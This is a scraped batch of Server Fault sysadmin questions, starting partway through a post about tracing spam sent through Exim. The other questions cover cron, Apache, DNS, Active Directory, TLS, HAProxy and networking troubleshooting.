<pre><code>2016-02-14 01:42:00 SMTP connection from (jabosupply.dcr103.com) [255.255.255.255]:33165 closed by QUIT
2016-02-14 01:42:00 1aUlhH-0006fx-UO =&gt; cpm147 &lt;lstockings@site1.com&gt; R=localuser T=local_delivery
2016-02-14 01:42:00 1aUlhH-0006fx-UO Completed
2016-02-14 01:42:03 1aUlhL-0006gS-RD &lt;= AmeliaCruz@site2.com H=(site2.com) [255.255.255.255]:54467 P=esmtp S=25154 id=456dfg4.G880UOMSX255.255.255.255@lisalou.vegan$
2016-02-14 01:42:04 cwd=/var/spool/exim 3 args: /usr/sbin/exim -Mc 1aUlhL-0006gS-RD
2016-02-14 01:42:04 1aUlhL-0006gS-RD =&gt; cpm147 &lt;duke@site1.com&gt; R=localuser T=local_delivery
2016-02-14 01:42:04 1aUlhL-0006gS-RD Completed
2016-02-14 01:42:04 SMTP connection from (site2.com) [255.255.255.255]:54467 closed by QUIT
2016-02-14 01:42:05 SMTP connection from [255.255.255.255]:40445 (TCP/IP connection count = 5)
2016-02-14 01:42:05 no host name found for IP address 255.255.255.255
2016-02-14 01:42:11 SMTP connection from [255.255.255.255]:58622 (TCP/IP connection count = 6)
2016-02-14 01:42:12 1aUlhU-0006hP-C9 &lt;= GregoryLittle@site3.com H=(site3.com) [255.255.255.255]:48668 P=esmtp S=37419 id=DV59FTL1CMF.gfjh3ufdg45q1111.6603.WE@chimail1.m$
2016-02-14 01:42:12 cwd=/var/spool/exim 3 args: /usr/sbin/exim -Mc 1aUlhU-0006hP-C9
2016-02-14 01:42:12 SMTP connection from (site3.com) [255.255.255.255]:48668 closed by QUIT
2016-02-14 01:42:12 1aUlhU-0006hP-C9 =&gt; cpm147 &lt;duke@site1.com&gt; R=localuser T=local_delivery
2016-02-14 01:42:12 1aUlhU-0006hP-C9 Completed
2016-02-14 01:42:17 SMTP connection from [255.255.255.255]:40445 lost
2016-02-14 01:42:17 1aUSE4-0000ZZ-Tp == erika.guerra@fresno.heald.edu R=dkim_lookuphost defer (-1): host lookup did not complete
2016-02-14 01:42:17 1aUj64-0004bS-6P Message is frozen
2016-02-14 01:42:17 1aULQ4-0002bv-Bs Unfrozen by errmsg timer
2016-02-14 01:42:18 1aULQ4-0002bv-Bs ** alisa_mckinney@site4 R=dkim_lookuphost T=dkim_remote_smtp H=smtp.secureserver.net [255.255.255.255]: SMTP error from remote mail server $
2016-02-14 01:42:18 1aULQ4-0002bv-Bs alisa_mckinney@site4: error ignored
2016-02-14 01:42:18 1aULQ4-0002bv-Bs Completed
</code></pre></li>
<li><p>Tried turning off mail for the server via WHM - this is successful, but not a permanent solution!</p></li>
<li><p>Done a <code>top</code> to see the exim processes.  There are anywhere from 0 to 1 to about 7 of them, with user of either <code>root</code> or <code>mailnull</code>.  So the hosted user account is not identified.</p></li>
</ol>

<p>I am thinking there must be a PERL script or PHP script somewhere that is running this.  I need to identify it.  Can anyone help me locate the physical source of the script that is running.</p>

<p>P.S. My server is not high-use and none of the websites have mailing scripts.  I'm thinking this must have been injected so I am also changing passwords.  But my priority is to locate this.</p>
","<spam><exim>","2016-02-16 11:31:17"
"931614","commands not running from crontab","<p>I have setup and cron to check if a port is busy or free and if its free then it sends and email and then start golang api service </p>

<p>send mail is working properly but api server is not getting started</p>

<p>following is my crontab file </p>

<pre><code>*/2 * * * * /home/ubuntu/sh/projectrun.sh
</code></pre>

<p>It runs projectrun.sh file every 2 minute, following is my code in this sh file </p>

<pre><code>#!/bin/bash
lsof -i :8080 | grep LISTEN || echo ""Not listening"" | curl ""http://mysiteurl.com/serverlog/?s=cron""
lsof -i :8080 | grep LISTEN || echo ""Not listening"" | tmux new-session -d -s bkapi3_session 'bkapi'
</code></pre>

<p>first line is executing properly as I am getting mails regulary but second command is not working, it works if I run this command directly from console like </p>

<pre><code>lsof -i :8080 | grep LISTEN || echo ""Not listening"" | tmux new-session -d -s bkapi3_session 'bkapi'
</code></pre>

<p>Not sure what is the issue and how to resolve it </p>
","<cron><service><sh><tmux>","2018-09-19 05:16:05"
"931646","Is it a good idea to put shared files outside public_html / root?","<p>I just figured out that I can place files outside the domain root (outside public_html).</p>

<p>The benefit of placing functions outside the domain root is that I can use the same file on multiple domains. If I update my file in a single location, all my domains get updated.</p>

<p><strong>Like this:</strong></p>

<pre><code>include __DIR__ . '/../../my-hidden-folder/functions.php';
</code></pre>

<p>My question is, now that it's possible, is it a good idea to work like this? Or are there reasons why this is not a good approach?</p>

<p>Not that it probably matters but I use PHP, Apache and Cpanel.</p>
","<php><apache-2.4><root><documentroot>","2018-09-19 09:13:48"
"757719","Only apply .htaccess rules based on url","<p>I am looking to only apply certain rules if domain is *.example.com. How can I do this?</p>

<pre><code>##start if domain is *.example.com##

RewriteEngine On
RewriteCond %{HTTPS} !=on
RewriteCond %{HTTP:X-Forwarded-Proto} !https
RewriteRule ^.*$ https://%{SERVER_NAME}%{REQUEST_URI} [R,L]

RewriteCond %{HTTP_HOST} ^demo
RewriteRule ^robots\.txt$ robots_allow.txt

##end if domain is *.example.com

&lt;IfModule mod_deflate.c&gt;
    &lt;filesMatch ""\.(js|css|html|php)$""&gt;
        SetOutputFilter DEFLATE
    &lt;/filesMatch&gt;
&lt;/IfModule&gt;
</code></pre>
","<apache-2.2><.htaccess>","2016-02-17 05:55:31"
"757806","How to restart system-wide logging on a Linux server?","<p>I am running a <code>Centos 7 Linux</code> server. I tried to install <code>rsyslog</code>. Because of a misconfiguration, we had to uninstall it. Since then, I see that all logs are truncated and no new logs are being created.</p>

<p>How do I resolve this?</p>
","<linux><logging><log-files>","2016-02-17 12:23:47"
"757840","LAN access but no internet connection unless different subnet","<p>Dear SF@StackExchange,</p>

<p>I'm using an access point that provides LAN as well as WLAN capabilities using 4G to connect its hosts to the internet. DHCP is deactivated by design. Regardless of the OS connected, I can ping across <code>WLAN -&gt; LAN, LAN -&gt; LAN</code> and whatnot. Windows PC's are not affected of this and connect to the internet just fine leading me to believe it is within the settings of my Linux box I need to look.</p>

<p>When I'm on my Linux box however, I cannot get WLAN internet access while the WLAN interface on the AP shares the same subnet (<code>255.255.0.0</code>) as the LAN. </p>

<p>For instance, I cannot connect to the internet when both share the IP address space <code>169.254.x.x</code> but I <em>can</em> get connectivity through this setup:</p>

<p>WLAN: <code>Default GW: 192.168.1.1, Subnet: 255.255.255.0</code></p>

<p>LAN: <code>Default GW: 169.254.2.1, Subnet: 255.255.0.0</code></p>

<p>which is not what I'd like since that messes up the port forwarding that I will need.</p>

<p>I've tried setting up DNS for my linux machine as <code>8.8.8.8</code>. It can still ping the AP when sharing the same subnet at <code>169.254.2.1</code>.</p>

<p>Route -n log:</p>

<pre><code>Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         169.254.2.1     0.0.0.0         UG    600    0        0 wlp3s0
169.254.0.0     0.0.0.0         255.255.0.0     U     600    0        0 wlp3s0
</code></pre>

<p>cat /etc/resolv.conf:</p>

<pre><code># Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
nameserver 127.0.1.1
</code></pre>

<p>(It does state this with a working AP too though)</p>
","<linux><routing><internet><subnet><access-point>","2016-02-17 14:43:50"
"757848","wrap exe to another exe with silent installation command","<p>I need help to check what is the tool able achieve this by wrap the exe and lic file and run the command</p>

<p>I have a installer.exe and installer.lic file, the exe support silent install command install the program silently </p>

<p>eg : installer.exe -l installer.lic</p>

<p>Thanks</p>
","<windows><packaging>","2016-02-17 15:09:15"
"757876","Any 3 port NIC's made?","<p>basically want a 3 ethernet port NIC. is there really none of these available? cause i'm working on a project that only requires 3 ports,and the 4 port ones are ridiculously expensive. Yes,i know ebay is our friend,but they don't really ship to where i'm at. so just asking,has there been any 3 port NICs ever manufactured before?</p>
","<nic>","2016-02-17 16:30:28"
"931892","App MSI install hangs up on newly imaged PCs (Win10)","<p>I'm working on an issue that got kicked up to me from Tier 1. I have a proprietary app that's built into an MSI for deployment with a VBscript. I didn't do the build and I don't have access to the source files. </p>

<p>On PCs that have been online for a while, the install takes about 2 minutes and works without incident. On newly imaged PCs (with the same image!), the install just hangs and never completes. Some files and shortcuts are copied to relevant directories, but the installer doesn't complete and the app won't launch so some core piece is not making it through.</p>

<p>No relevant messages appear in the Windows event log. The install log always hangs up at this point: </p>

<pre><code>InstallShield 6:55:08: Registering file c:\Program Files (x86)\[app]\[subfolder]\Lib\igVIEW15a.ocx (32-bit)
</code></pre>

<p>There are also several of these throughout the log:</p>

<pre><code>InstallShield 6:55:08: Error loading ISBEW64.exe...File does not exist
InstallShield 6:55:01: Error extracting ISBEW64.exe from ISRegSvr.dll
</code></pre>

<p>I don't think the package or script is broken as it does work on most systems - just not on some. I'm thinking some kind of relevant core file or registry entry is missing. Google tells me these are InstallShield files, but their support forum is paywalled unfortunately so any easy fixes there are hidden from view. </p>

<p>I've been working on this for two days and I'm stumped. Any ideas?</p>
","<installation><windows-10><msi><windows-installer>","2018-09-20 15:03:14"
"931954","What's so great about App-V?","<p>App-V is one of those technologies that has a small but extremely enthusiastic fan base.  And thinking it might be useful at my company, I decided to give it a try.  After doing a 2-week deep dive into it and sequencing/publishing a few apps (Java, Reader, Citrix, Chrome, etc.), I think I have a pretty good handle on what it's all about and what it can do.</p>

<p>Unfortunately, I'm rapidly coming to the conclusion that App-V creates more problems than it solves, and I am posting this question in the hopes that someone can help me understand if I'm missing some fundamental point of the product, or if App-V just isn't a good fit for my environment.</p>

<p>So here is a list of App-V's promises as I understand them, and the reality I have observed working with it:</p>

<hr>

<p><strong>Promise:</strong> Application coexistence.  App-V allows you to package and run applications together that normally don't get along well with each other.  We have two line-of-business apps with dependencies on the Pro version of Acrobat 9, and Excel 2010 respectively.  Both break horribly when modern versions of Adobe Reader or MS Office are installed, and neither works well in an RDS environment. Since Office and Reader are core apps, I have to manage those PCs separately, which is a pain in the butt.  App-V should allow me to package those apps together with their dependencies inside the App-V bubble, so they won't be disturbed by their natively-installed brethren.</p>

<p><strong>Reality:</strong>  It doesn't work that way.  In order for coexistence to function properly, both instances of the dependent application (Acrobat Pro/Reader, and Office 2010/2016) must be virtual.  Which means I either have to make them virtual for the whole org, or I'm still stuck managing those PCs separately.  App-V doesn't get me anything.</p>

<hr>

<p><strong>Promise:</strong>  App-V allows you to package applications with your own customizations so that users do not see things like first-run dialogs, useless icons, or prompts for information they don't know (like server names) that would ordinarily generate help desk calls.</p>

<p><strong>Reality:</strong>  I've gotten really good over the years at suppressing all that garbage with scripts, group policies, etc., so we're already doing this with natively-installed apps.  The amount of time it takes to shut these programs up with scripts and registry hacks is about the same as it takes to sequence and customize the program on a reference PC.  There's no time savings there. Also, some apps just plain don't work with App-V so you have to script and hack those anyway.</p>

<hr>

<p><strong>Promise:</strong> Virtual applications are fully sandboxed, offering better security and application resiliency.  App-V packages cannot interact with one another except through connection groups that you control. And while Microsoft explicitly warns that this is not a security boundary, it nonetheless does reduce the attack surface for malware. Additionally, native applications frequently leave turds all over your filesystem and registry that do not get cleaned up when you uninstall, making troubleshooting more difficult. But virtual apps are self-contained bubbles, making them easy to cleanly remove or revert to a known good state.</p>

<p><strong>Reality:</strong>  App-V packages are not Docker containers.  They are hidden from the OS, but the OS is not hidden from them. They still leave turds all over your filesystem and registry. And because most apps have COM interfaces must be exposed to the OS, virtual apps are <em>mostly</em> hidden from the OS, but not <em>fully</em>. This makes troubleshooting harder, not easier.  Also, we use profile roaming, folder redirection, and have a homogeneous desktop image. Any computer that will take more than an hour to fix gets nuked and reloaded.</p>

<hr>

<p><strong>Promise:</strong> Streamed content. Virtual applications are delivered only on-demand, and only take as much disk space as required for the features that people actually use.  This is good because we do have a disk space problem around here. Also, streamed content can be used for locked-down static desktops such as thin clients with write filters, or VDI scenarios.</p>

<p><strong>Reality:</strong> Content streaming is just too slow to be useful. Even on a standard workstation with a LAN connection, there is an initial delay on first-launch while the package's critical bits are fetched and cached.  Then, as new features are used, there is another delay for <em>those</em> bits.  There is no user feedback given, and the delay is long enough to make people think their computer is broken. This makes for a truly awful user experience.  And then there's the issue of laptops. If you take one off-campus, you're dead in the water if you try to use something that hasn't been cached. You can only mitigate this problem per-package, not per-device.  Unless you're using SCCM (which we are), in which case, the package ""streams"" from the local SCCM cache to the local App-V cache, taking up TWICE as much space. Yay!</p>

<hr>

<p>So I reiterate my question. What's so great about App-V? I can see some great benefits to virtualizing apps, and there are entire web sites out there dedicated to App-V recipes and techniques.  I <em>want</em> to love this product. But with the problems I've outlined, I can't really justify it.</p>

<p>Or am I missing something here?</p>
","<windows><virtualization><configuration><installation><app-v>","2018-09-20 21:59:56"
"757951","Utilizing TLS 1.2 on CentOS 5.11 for use with Paypal IPN","<p>Our current web stack is installed on a CentOS 5.11 server with Plesk. We are using PHP 5.4, cURL 7.47.1, and openSSL 0.9.8e-fips-rhel5 01 Jul 2008. I am trying to run Paypal IPNs using code based off of the example found here: <a href=""https://github.com/paypal/ipn-code-samples/blob/master/paypal_ipn.php"" rel=""nofollow noreferrer"">https://github.com/paypal/ipn-code-samples/blob/master/paypal_ipn.php</a>.</p>

<p>The issue is that the handshake is trying to use SSLv3 which appears to not be supported by Paypal (maybe I'm wrong?). I am getting this error: <code>error:14077410:SSL routines:SSL23_GET_SERVER_HELLO:sslv3 alert handshake failure</code>. I have found other places saying to try a couple things. All of which I have. I have tried using</p>

<p><code>curl_setopt($ch, CURLOPT_SSLVERSION, 5);</code></p>

<p><code>curl_setopt($ch, CURLOPT_SSLVERSION, 6);</code></p>

<p><code>curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, ""TLSv1"");</code></p>

<p><code>curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, ""TLSv1.2"");</code></p>

<p>None of which have worked. Both cURL and OpenSSL are updated to the most recent port available to CentOS 5.11.</p>

<p>I am hoping that either I am missing something, that there is a way to run the Paypal IPN without TLS, or there is a way to update openSSL to 1.0.1g. Any help would be greatly appreciated.</p>

<p>Note: Upgrading to CentOS 6 is not an option.</p>
","<ssl><openssl><centos5><tls><curl>","2016-02-17 21:37:30"
"758011","Dc Replication issue when on one of the Dc moved to another location","<p>We have one Domain controller in Dallas office and other 2 in Chicago.
An administrator in Chicago moved 1 domain controller to Salt lake, now the problem starts here Chicago location and salt lake can communicate with each other, But the domain controller in Dallas cannot communicate with salt lake but it can communicate with Chicago Domain controller. Can it be resolved via Ad sites and services.?</p>
","<active-directory><domain-controller>","2016-02-18 03:29:28"
"758050","Does Ping ever uses DNS cache","<p>I have couple questions.</p>

<p>Firstly, this morning I was running <code>ping</code> against <code>google.com</code> and it returned me an address <strong>216.58.220.14</strong>.</p>

<p>Now what strange happened was, any time after the first ping all attempt to ping resulted in same address i.e <strong>216.58.220.14</strong>  (I was expecting different address at least some time considering google would be load balancing them)</p>

<p>So, I ask my friend (my colleague) sitting next to me(over the same network) to <code>ping google.com</code>  and as I was expecting, it returned a different addresses.</p>

<p><strong>Question 1:</strong> Does Ping uses machine DNS cache.  </p>

<p><strong>Question 2:</strong>  How to display DNS caches entries of Linux(Ubuntu).</p>
","<linux><domain-name-system><ping>","2016-02-18 09:02:56"
"758135","Windows File Server without DC","<p>Hello everyone: Recently I have got assignment to establish a windows file server, there are only 15 laptops. I am not a network/server guy but familiar with basics.</p>

<p>1- All clients(win7,10) are connected with a simple wifi-router (DHCP enabled)
2- I have installed windows server 2012 r2 standard ED</p>

<p>What I want to achieve is: I want to share folders where clients can access folders with credentials without domain controller. </p>

<p>Because all 15 employees have laptops and they carry with it. If I setup Domain Controller then I guess I have to assign static ip address and whenever they will leave office they won't be able to access login in their window account? right? If they can access then they won't be able to connect to different wifi internet at their homes because their laptops are configured with static ip. </p>

<p>How can I achieve this task? I just want simple file sharing with credential. All systems including server will be connected with router for internet access. </p>

<p>One more thing if i setup Active Directory do I need to create DC as well? </p>

<p>I would appreciate if someone can help me in this regard. </p>
","<windows-server-2012-r2>","2016-02-18 15:05:28"
"758208","Convert SVN repository to git","<pre><code>$ svn --version
svn, version 1.8.9 (r1591380)

$ git --version
git version 1.7.1

$ git svn clone http://host/path/to/project/
Initialized empty Git repository in /home/user/to/project/.git/
Can't load '/usr/local/lib64/perl5/auto/SVN/_Core/_Core.so' for module SVN::_Core: /usr/local/lib64/perl5/auto/SVN/_Core/_Core.so: undefined symbol: svn_swig_pl_thunk_gnome_keyring_unlock_prompt at /usr/lib64/perl5/DynaLoader.pm line 200.
 at /usr/local/lib64/perl5/SVN/Base.pm line 59
BEGIN failed--compilation aborted at /usr/local/lib64/perl5/SVN/Core.pm line 5.
Compilation failed in require at /usr/libexec/git-core/git-svn line 41.
</code></pre>

<p>If I use a more recent git:</p>

<pre><code>$ /opt/git/bin/git --version
git version 2.7.0.GIT
</code></pre>

<p>I get:</p>

<pre><code>Can't load '/usr/local/lib64/perl5/auto/SVN/_Core/_Core.so' for module SVN::_Core: /usr/local/lib64/perl5/auto/SVN/_Core/_Core.so: undefined symbol: svn_swig_pl_thunk_gnome_keyring_unlock_prompt at /usr/lib64/perl5/DynaLoader.pm line 200.
 at /usr/local/lib64/perl5/SVN/Base.pm line 59
BEGIN failed--compilation aborted at /usr/local/lib64/perl5/SVN/Core.pm line 5.
Compilation failed in require at /opt/git/share/perl5/Git/SVN/Utils.pm line 6.
BEGIN failed--compilation aborted at /opt/git/share/perl5/Git/SVN/Utils.pm line 6.
Compilation failed in require at /opt/git/share/perl5/Git/SVN.pm line 32.
BEGIN failed--compilation aborted at /opt/git/share/perl5/Git/SVN.pm line 32.
Compilation failed in require at /opt/git/libexec/git-core/git-svn line 21.
</code></pre>
","<svn><git><perl>","2016-02-18 19:34:59"
"758340","Incorrect Disk space usage in Linux server","<p>I can see the used disk quota on server is 81G for partition /dev/sda3 mounted to '/' as follows.</p>

<pre><code>Filesystem      Size  Used Avail Use% Mounted on
/dev/sda3       106G   81G   20G  81% /
tmpfs           1.9G     0  1.9G   0% /dev/shm
/dev/sda1       477M   52M  400M  12% /boot
tmpfs           1.0G     0  1.0G   0% /var/lib/mysqltmp
/usr/tmpDSK     4.0G  183M  3.6G   5% /tmp
</code></pre>

<p>But when Iam checking with the '/' directory by executing du -sh command it is taking only 17G of disk space, can any one advice where this remaining space is utilized, any advice ? Iam using CentOS release 6.7 (Final)</p>
","<linux><hard-drive><hardware><centos6>","2016-02-19 10:43:29"
"758410","Servers unexpectedly change to BDC on AD?","<p>I've got two AD virtual machines runnning on HyperV. AD1(PDC) syncs its time with pool.ntp.org and AD2(BDC) syncs with AD1 to get the time correct. Both are windows server 2008 servers.</p>

<p>This worked fine for a while, but lately servers seem to drop out from AD1 and authenticate with AD2 instead, even though AD1 is up and running.</p>

<p>I've tried to shut down AD2 and restart all servers on the domain to force them to authenticate to AD1 which works fine. But whenever I put AD2 on the network again servers will still auth to AD2 on reboot.</p>

<p>This behavior is unknown to me and I'm having a hard time troubleshooting the issue.</p>
","<windows-server-2008><active-directory>","2016-02-19 15:08:57"
"758455","Is it ever beneficial to log in to a server / page returning 403: Forbidden?","<p>IE 11 and Microsoft Edge both recommend logging in after receiving an HTTP 403: Forbidden.</p>

<p>The package <code>hc</code> says this about error 403:</p>

<blockquote>
  <p>Code explanation: Request forbidden -- <strong>authorization will not help</strong></p>
</blockquote>

<p><a href=""http://en.wikipedia.org/wiki/HTTP_403"" rel=""nofollow noreferrer"">Wikipedia</a> also says:</p>

<blockquote>
  <p>Status codes 401 (Unauthorized) and 403 (Forbidden) have distinct meanings.</p>
  
  <p>A <strong>401 response indicates that access to the resource is restricted,
  and the request did not provide any HTTP authentication.</strong> It is
  possible that a new request for the same resource will succeed if
  authentication is provided. The response must include an HTTP
  WWW-Authenticate header to prompt the user-agent to provide
  credentials. If credentials are not provided via HTTP Authorization,
  then 401 should not be used.</p>
  
  <p>A 403 response generally indicates one of two conditions:</p>
  
  <blockquote>
    <p>Authentication was provided, but <strong>the authenticated user is not
    permitted to perform the requested operation.</strong></p>
    
    <p>The operation is
    <strong>forbidden to all users.</strong> For example, requests for a directory listing
    return code 403 when directory listing has been disabled.</p>
  </blockquote>
</blockquote>

<p>The error code given by IE and Edge would seem to imply there are cases in which logging in would help the problem. I <a href=""https://connect.microsoft.com/IE/feedbackdetail/view/2380626/edges-http-403-error-page-recommends-logging-in-as-a-solution-contrary-to-the-http-standard"" rel=""nofollow noreferrer"">filed a bug about this here</a>, but I thought I'd give Microsoft some slack. </p>

<p>In which cases is logging in a solution to 403: Forbidden?</p>
","<http-status-code-403>","2016-02-19 17:03:36"
"758581","HTTPS activated, how to refuse HTTP connections","<p>I recently installed an SSL certificate on my server and now HTTPS seems to work for all the pages. </p>

<p>However, the server is still accepting connections from HTTP. How do I enforce HTTPS? </p>

<p>I use a CentOS Linux distribution on my server. </p>
","<linux><centos><ssl><http><https>","2016-02-20 10:09:46"
"758649","How do I set up multiple displays for a single computer over ethernet","<p>Currently I have 4 computers in separate rooms, connected through ethernet. It is a dental clinic and those computers are used to plug in some equipment via usb. </p>

<p>I was wondering if it would be possible to have just one computer, and multiple displays, with usb connectors. That would solve many of the issues we are having with synchronization of the data between computers.</p>

<p>I simply want to have one computer have multiple displays and be able to connect usb at each display location. Ethernet connection is available.</p>

<p>It is okay if they all display the same view.</p>
","<networking>","2016-02-20 19:01:07"
"758842","Server 2012 R2 - Can't access remote 2012 server in ""all servers""","<p>This is a scenario set up for MCSA training in my homelab, not an enterprise environment. </p>

<p>I'm trying to make changes to add roles to a virtual machine (VM workstation) Server 2012 R2 (running in bridged mode, meaning it gets dynamic IP from physical default gateway dhcp server) from my main Server 2012 R2 physical server from Server Manager, All Servers. </p>

<p>I add the remote server, TESTSERVER1, via manage->add servers and it shows up as such in ""All Servers"":
<a href=""https://i.sstatic.net/D8tvw.png"" rel=""nofollow noreferrer"">https://i.sstatic.net/D8tvw.png</a></p>

<p>Here are the error messages produced: <a href=""https://i.sstatic.net/TB2Np.png"" rel=""nofollow noreferrer"">https://i.sstatic.net/TB2Np.png</a></p>

<p>The main physical server, APOLLO has a static IP but the VM server is dynamic. This is a 255.255.255.0 subnet.
This is a workgroup environment.</p>

<p>How can I gain access to TESTSERVER1 so I can make changes to it remotely. When I right click it, ""add roles and features"" and ""restart server"" are greyed out. I appreciate any insight, thank you.</p>
","<windows><windows-server-2008><windows-server-2012><remote-access><workgroup>","2016-02-22 05:07:54"
"758866","Windows server does not serve .plist and .ipa files","<p><code>.plist</code> and <code>.ipa</code> are files for iOS enterprise distribution of Apps.</p>

<p>I want to host them on my enterprise server for distribution. However, the server used does not allow these kinds of files.</p>

<p>I have uploaded them to the directory, when I try to download them I get the following error:</p>

<p><a href=""https://i.sstatic.net/E3JXF.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/E3JXF.png"" alt=""enter image description here""></a></p>

<p>If I only change the extension to ""txt"", ""rar"" or any popular extensions. The file gets downloaded with no errors.</p>

<p>What is the problem? Is it a security measure for Windows server or just a blacklist/whitelist of files?</p>

<p>How to solve it.</p>

<p>Windows Server 2008</p>
","<windows-server-2008>","2016-02-22 07:40:08"
"758950","Can I use wifi and LAN on win server 2012?","<p>Iam not a network guy. But recently installed Windows server r2 and configured active directory, DC and file server. Currently domain users are using file server over wifi. </p>

<p>Server IP configured in wifi is 192.168.10.100</p>

<p>All domain users are transferring files via wifi on win server. Now I want if user is connected with LAN then user can also access same file server on LAN connectivity.</p>

<p>Is it possible? If possible then how DNS will be configured in lan? For instance wifi server IP is 192.168.10.100 which I have added in wifi LAN. and i have added this IP in users PC in TCP/IP in DNS. And setting up getting IP automatically from the dhcp router. </p>

<p>If iam not wrong we can not assign same server IP in wifi and Ethernet . can some one plz give me hint so that I can Google?</p>
","<windows-server-2012-r2>","2016-02-22 14:52:58"
"759001","squid never_direct to certain domain and computer","<p>I need configuration squid proxy server to redirect one ip (one user) to parent proxy, also certain domain.
My configuration at now : </p>

<pre><code>acl vkdomain dstdomain vkontakte\.ru vk\.ru vk\.com \.vk\.com
    #http_access allow 192.168.35.145 vk
    #http_access allow 192.168.35.146 vk cache_peer 192.168.32.1 parent 9999 proxy-only
 acl vkuser src 192.168.35.145 never_direct allow vkuser vkdomain
</code></pre>

<p>on 192.168.32.1 regular hardware router like</p>
","<proxy><squid>","2016-02-22 18:02:06"
"759064","DigialOcean Droplet clone of a wordPress website - DNS not resolving","<p>I have a website <strong>mywebsite1.com</strong> runing <strong>wordpress</strong> and hosted on digitalOcean droplet using <strong>LEMP</strong> (Nginx/php/mysql) on Ubunto server, am trying to duplicate the same site and use a new DNS <strong>mywebsite2.com</strong> to point to the new droplet IP, the problem is that the new DNS doesn't load and try to connect to the server then stop loading, here what I got
on fireFox :</p>

<pre><code>Unable to connect
</code></pre>

<p>on chrome :</p>

<pre><code>This webpage is not available
ERR_CONNECTION_REFUSED
</code></pre>

<p>I am a Linux beginner, so for sure there's something missing .. here what I did step by step :</p>

<ul>
<li>On my DNS provider I added <strong>A</strong> type <strong>mywebsite2.com</strong> to point to my new Droplet IP.</li>
<li>CNAME <strong>www.mywebsite2.com</strong> to point to  <strong>mywebsite2.com</strong></li>
<li>Updated my databasedump.sql with the new domain <strong>mywebsite2.com</strong></li>
<li>Updated my config.php file (Wordpress)</li>
<li>Renamed my website directory :</li>
</ul>

<blockquote>
  <p>/home/html/mywebsite1.com to /home/html/mywebsite2.com</p>
</blockquote>

<pre><code>ls -l 
</code></pre>

<p><a href=""https://i.sstatic.net/6YE4C.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/6YE4C.png"" alt=""enter image description here""></a></p>

<ul>
<li>Go to :</li>
</ul>

<blockquote>
  <p>/etc/nginx/sites-available and renamed mywebsite1.com to mywebsite2.com and updated all the file</p>
</blockquote>

<ul>
<li>Delete the old symlink and create a new one for the new DNS, using this cmd :</li>
</ul>

<blockquote>
  <p>sudo ln -s /etc/nginx/sites-available/mywebsite2.com
  /etc/nginx/sites-enabled/mywebsite2.com</p>
</blockquote>

<ul>
<li>Restart nginx ..</li>
</ul>

<p><strong>Note :</strong> I have an SSL certificate (Wildcard) that is working on mywebsite1.com, but recently bought a new one for mywebsite2.com and left the same config and put the new certification files (public &amp; private)</p>

<p><strong>Note 2 :</strong> Runing ping to mywebsite2.com is working and whois (cmd) give me the right DNS provider.</p>

<p>What am I missing please? Any suggestion is very welcome am trying to figure out what is wrong.</p>

<p>Thanks!</p>
","<nginx><domain-name-system><vpn><wordpress><ubuntu-14.04>","2016-02-22 23:51:41"
"759100","Can a RAID 10 array be transferred from a Windows box to a Synology (or other) enclosure?","<p>Currently I'm debating about whether I want to use a spare workstation running Windows 10 and turn that into the enclosure for a 4x6TB RAID 10 array since it has decent hardware specs or wait until there's room in the budget to purchase a dedicated NAS enclosure from Synology or some other vendor if what I want isn't possible as I would have to reformat/re-array for the enclosure. I know there is some difficulty with software &lt;-> hardware driven array migrations according to this Q&amp;A from '09:</p>

<p><a href=""https://serverfault.com/questions/61823/moving-a-raid-array-from-one-machine-to-another"">Moving a RAID array from one machine to another</a></p>

<p>However given 7 years have passed and the rise of NAS storage for small business I was wondering if things have changed and if it's possible to have the RAID 10 initially set up in a spare workstation to use now and then migrate the RAID array and it's data w/o issue to a dedicated NAS enclosure from Synology et al when there's more money so that I can then free up the workstation again.</p>
","<raid><raid10>","2016-02-23 05:48:52"
"759144","Directadmin httpd dead but pid file exists","<p>I checked Service Monitor and saw</p>

<blockquote>
  <p>httpd Process is stopped</p>
</blockquote>

<p>Then I try to use root for restart httpd. It still the same
Then I check httpd status
It's shown</p>

<blockquote>
  <p>httpd dead but pid file exists</p>
</blockquote>

<p>Im using DirectAdmin 1.50.0, Apache 2.2.31</p>

<p>I have try to kill process and restart it again but It doesnt work. any help will be greatly appreciated. Thank you</p>
","<apache-2.2>","2016-02-23 10:05:39"
"759187","Displaying methods of the wshNetwork object","<p>I need to create a variable to represent the wshNetwork object.  Using this variable I need to display all the methods that this object supports, and only display these methods?  Any suggestions?  Thanks.</p>
","<powershell>","2016-02-23 13:28:28"
"759207","How can I move only my website, not email, to a DigitalOcean droplet?","<p>I have a website and email on a VPS with cPanel. I'm ready to launch the new website on a different droplet with Digital Ocean. How can I achieve this and keep all email and email forwarders on my old server?</p>

<p><a href=""https://i.sstatic.net/6jSEC.png"" rel=""nofollow noreferrer"">Here's a screenshot of my current zone file in cPanel</a> </p>
","<linux><networking>","2016-02-23 15:00:35"
"759273","Is it possible to configure HAProxy to listen on IPV4, but send the request using IPV6?","<p>Trying to configure HAProxy to listen for requests on port ipv4(Port 80) but proxy the request through eth1 to a server using ipv6. The request must be show the ipv6 address for the request. We don't want to expose the ipv4 address.</p>

<p>Is this possible using HAProxy? If not, what should we look into?</p>
","<proxy><haproxy><ipv6><ipv4>","2016-02-23 18:49:01"
"759274","Let OS X ScreenSharing accept incoming connections only from a list of trusted IPs","<p>As a security measure, is it possible to set up screen sharing on a remote Mac to accept connections only from a given list of IP addresses?</p>

<p>(<em>Of course I could set up a firewall to allow traffic on VNC specific ports only from/to trusted IPs but I was looking for a easier solution (I don't have a firewall in front of that Mac yet and I'd prefer not to mess with OS X builtin software firewall</em>)   </p>
","<security><mac-osx><ip><whitelist><screen-sharing>","2016-02-23 18:51:03"
"759400","Difference between 1.0 Gbps & Auto Negotiation","<p>I am downloading a huge file and was wondering on how to boost my Ethernet speed. I found this option called ""Speed &amp; Duplex"" And there were a few options. Two of them were</p>

<p>1) 1.0 Gbps Full Duplex</p>

<p>2) Auto Negotiation (Which was on default)</p>

<p>I switched to 1.0 Gbps Full Duplex and used Task Manager to check my speed.</p>

<p>No difference...</p>

<p>So what does it do? And why do I see no difference?</p>
